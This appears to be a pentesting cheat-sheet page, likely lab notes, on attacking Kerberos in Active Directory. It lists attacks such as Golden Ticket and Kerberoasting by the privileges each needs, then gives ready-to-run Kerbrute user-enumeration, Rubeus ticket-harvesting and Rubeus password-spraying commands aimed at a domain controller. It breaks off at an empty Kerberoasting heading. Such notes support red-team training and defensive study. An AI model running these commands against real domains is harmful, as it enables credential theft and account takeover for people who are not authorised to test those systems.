# Attacking Kerberos

## Attack Privilege Requirements

* Kerbrute Enumeration - No domain access required&#x20;
* Pass the Ticket - Access as a user to the domain required
* Kerberoasting - Access as any user required
* AS-REP Roasting - Access as any user required
* Golden Ticket - Full domain compromise (domain admin) required&#x20;
* Silver Ticket - Service hash required&#x20;
* Skeleton Key - Full domain compromise (domain admin) required

## Enumeration w/Kerbrute

Brute force user accounts from a domain controller using a supplied wordlist:

```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Harvesting & Brute-Forcing Tickets w/Rubeus

Harvest for TGTs every 30 seconds:

```powershell
Rubeus.exe harvest /interval:30
```

## Brute-Forcing / Password-Spraying w/ Rubeus

{% hint style="info" %}
Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file
{% endhint %}

```powershell
Rubeus.exe brute /password:Password1 /noticket
```

This returns .kirbi ticket (TGT)

{% hint style="warning" %}
Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
{% endhint %}

## Kerberoasting w/ Rubeus & Impacket

